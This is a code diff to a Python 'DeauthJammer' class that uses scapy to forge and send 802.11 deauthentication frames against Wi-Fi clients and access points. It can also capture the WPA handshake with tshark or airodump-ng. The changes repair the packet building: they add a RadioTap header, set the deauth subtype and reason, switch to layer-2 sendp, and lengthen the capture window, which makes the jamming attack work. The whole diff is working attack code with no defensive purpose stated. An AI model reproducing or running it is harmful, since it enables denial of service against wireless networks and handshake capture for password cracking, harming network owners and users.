@@ -49,9 +49,7 @@ class DeauthJammer(object):
         capture_filename = "capture_" + str(time.time()) + ".pcap"
         if capture_handshake:
             FNULL = open(os.devnull, 'w')
-            # proc = subprocess.Popen(["tshark", "-i", scapy.conf.iface, "-w", capture_filename, "-f", "type mgt"], stdin=None,
-            #                        stderr=FNULL, stdout=FNULL, close_fds=True)  # we might add -a as filter for only capturing unassociated clients
-            proc = subprocess.Popen(["airodump-ng", "-c", str(channel), "-w", capture_filename, scapy.conf.iface], stdin=None,
+            proc = subprocess.Popen(["tshark", "-i", scapy.conf.iface, "-w", capture_filename], stdin=None,
                                     stderr=FNULL, stdout=FNULL, close_fds=True)  # we might add -a as filter for only capturing unassociated clients
 
         for target in targets:
@@ -67,7 +65,7 @@ class DeauthJammer(object):
                     thread.join(.1)
 
             if capture_handshake:
-                time.sleep(1)
+                time.sleep(10)
                 proc.terminate()
                 proc.wait()
 
@@ -91,12 +89,12 @@ class DeauthJammer(object):
 
     def _deauth_target(self, target, packet_count):
         broadcast = target.lower() != 'FF:FF:FF:FF:FF:FF'
-        ap_to_client_pckt = scapy.Dot11(addr1=target, addr2=self._ap_bssid,
-                                        addr3=self._ap_bssid) / scapy.Dot11Deauth()
-        client_to_ap_pckt = None
-        if not broadcast:
-            client_to_ap_pckt = scapy.Dot11(
-                addr1=self._ap_bssid, addr2=target, addr3=self._ap_bssid) / scapy.Dot11Deauth()
+        ap_to_client_pckt = scapy.RadioTap()/scapy.Dot11(type=0, subtype=12, addr1=target, addr2=self._ap_bssid,
+                                        addr3=self._ap_bssid) / scapy.Dot11Deauth(reason=1)
+        # client_to_ap_pckt = None
+        # if not broadcast:
+        #     client_to_ap_pckt = scapy.Dot11(
+        #         addr1=self._ap_bssid, addr2=target, addr3=self._ap_bssid) / scapy.Dot11Deauth()
 
         actually_sent = 0
         for n in range(packet_count) or packet_count == -1:
@@ -106,11 +104,11 @@ class DeauthJammer(object):
             if n % 64 == 0:
                 time.sleep(0.1)
 
-            scapy.send(ap_to_client_pckt)
+            scapy.sendp(ap_to_client_pckt)
 
             # Seems not to be neccessary
-            if not broadcast:
-                scapy.send(client_to_ap_pckt)
+            # if not broadcast:
+            #     scapy.send(client_to_ap_pckt)
 
             actually_sent = n
 
